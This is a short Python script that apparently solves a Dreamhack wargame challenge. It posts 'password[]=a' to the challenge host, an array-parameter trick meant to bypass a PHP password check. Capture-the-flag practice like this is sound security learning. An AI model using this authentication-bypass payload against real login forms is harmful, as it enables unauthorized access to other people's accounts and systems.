import requests

port = 19524
url_index = f"http://host3.dreamhack.games:{port}/"
url_source = url_index + "?view-source"

param = {"password[]": "a"}

r = requests.post(url_index, data=param)
print(r.text)
